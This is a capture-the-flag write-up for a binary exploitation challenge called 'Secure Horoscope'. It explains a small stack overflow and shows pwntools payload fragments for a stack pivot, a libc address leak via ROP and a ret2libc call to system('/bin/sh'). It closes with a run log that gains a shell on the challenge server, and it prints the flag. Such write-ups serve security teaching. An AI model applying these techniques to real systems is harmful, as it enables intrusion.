# Secure Horoscope
`checksec` output:
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```
Looking at the decompiled C in `ghidra`:
```c
int main(int argc,char **argv) {
    char buf [40];
    int i;
  
    i = 0;
    puts("We fixed some bugs in our last horoscope, this one should be secure!\n");
    puts("To get started, tell us how you feel");
    fflush(stdout);
    fgets(buf,0x28,stdin);
    printf("feeling like %s? That\'s interesting.",buf);
    fflush(stdout);
    for (; i != 2; i = i + 1) {
        puts("please put in your birthday and time in the format (month/day/year/time) and we will have y our very own horoscope\n");
        fflush(stdout);
        getInfo();
        puts("want to try again?\n");
        fflush(stdout);
    }
    puts("too bad, we don\'t have the resources for that right now >:(");
    fflush(stdout);
    return 0;
}
```
`main` read 39 bytes + null byte into a 40 bytes buffer, so no overflow vulnerability.<br>
However `main` calls `getInfo`:
```c
void getInfo(void) {
    char info [100];
  
    memset(info,0,100);
    read(0,info,0x8c);
    puts(info);
    puts("hm, I\'ll have to think about what this means. I\'ll get back to you in 5 business days.");
    fflush(stdout);
    return;
}
```
`getInfo` has a declares a 100 byte buffer and then reads 140 bytes into it. Although when looking at the assembly, the buffer is actually 112 bytes.
```
        004007cf 48 8d 45 90     LEA        RAX=>info,[RBP + -0x70]
        004007d3 ba 8c 00        MOV        EDX,0x8c
                 00 00
        004007d8 48 89 c6        MOV        RSI,RAX
        004007db bf 00 00        MOV        EDI,0x0
                 00 00
        004007e0 e8 cb fd        CALL       <EXTERNAL>::read
```
`140 - (112 (buffer size) + 8 (saved rbp)) = 20`<br>
This results in a potential overflow of 20 bytes.<br>
Typically in buffer overflow attacks there are a few options:
1. return address is overwritten with a function that outputs a flag
2. shell is obtained via a ROP chain
3. shell is obtained via a return to libc attack

The binary does not have any random flag printing functions lying around, so option 1 is impossible. This leaves options 2 and 3. One issue is that 20 bytes is only enough for two gadgets and not enough to perform a full ROP or ret2libc attack.<br>

When dealing with buffers declared locally in functions, compilers will store them on the stack. If we can overwrite `rsp` (the stack pointer) with a pointer to somewhere we want to write to, when the function allocates the buffer on the stack and writes to it, it is instead writing to whatever address we put into `rsp`.<br>

The attack looks something like this:<br>
1. overwrite `rsp` with a pointer to the binary's bss section
2. force `getInfo` to call itself
3. write a ROP chain that leaks dynamic address of puts and calls `getInfo`
4. overwrite `rsp` with a pointer to libc bss section
5. write a ROP chain that calls `system("/bin/sh\x00")`

## Overwriting rsp
In C every function that returns begins with
```x86asm
push rbp
mov rbp, rsp
```
and ends with
```x86asm
leave
; equivalent to
; mov rsp, rbp
; pop rbp
```
The value of `rbp` is stored on the stack, allowing us to overwrite by overflowing the buffer. Afterwards instead of jumping to the beginning of `getInfo`, jump to after the function prolouge. This means when the function ends it will put our `rbp` into `rsp`. Now we have control over `rsp`.
```python
payload =  b''.ljust(112, b'0');         # fill the buffer
payload += p64(rop_chain + buf_len);     # overwrite saved value of rbp on the stack
payload += p64(get_info_skip_prolouge);  # overwrite return address
io.send(payload);
```

## Leaking libc base address
Once `rsp` is overwritten with the address of the bss section, when `getInfo` is called again we can write a ROP chain into the bss section and then trigger it by overwritting the return address of the function.
```python
attack =  p64(pop_rdi);
attack += p64(file.got['puts']);
attack += p64(file.plt['puts']);
attack += p64(main);
```

## Obtaining shell
After the libc address is leaked the same process above can be used to build a ROP chain in the bss section that calls `system("/bin/sh\x00")`.
```python
shell =  p64(pop_rdi);
shell += p64(rop_chain + 64);
shell += p64(leak + (libc.symbols['system'] - libc.symbols['puts']));
shell += p64(main);
```
When I tested the attack against the server the would always segfault. I assumed this was because the binary bss section was not large enough, so I overwrite `rsp` again except pointing it at the libc bss section this seemed to solve the issue.

## Running the attack
```
[+] Opening connection to sechoroscope.sdc.tf on port 1337: Done
[*] '/home/runner/nothingtosee/SECURE_HOROSCOPE/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/runner/nothingtosee/SECURE_HOROSCOPE/secure_horoscope'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
b'LEAKED BYTES equ pyx\xa1\xaf\x7f'
LIBC ADDRESS equ 0x7fafa1707000
[*] Switching to interactive mode
@
hm, I'll have to think about what this means. I'll get back to you in 5 business days.
$ ls
flag.txt
secureHoroscope
$ cat flag.txt
sdctf{Th0s3_d4rN_P15C3s_g0t_m3}
```
## Flag: sdctf{Th0s3_d4rN_P15C3s_g0t_m3}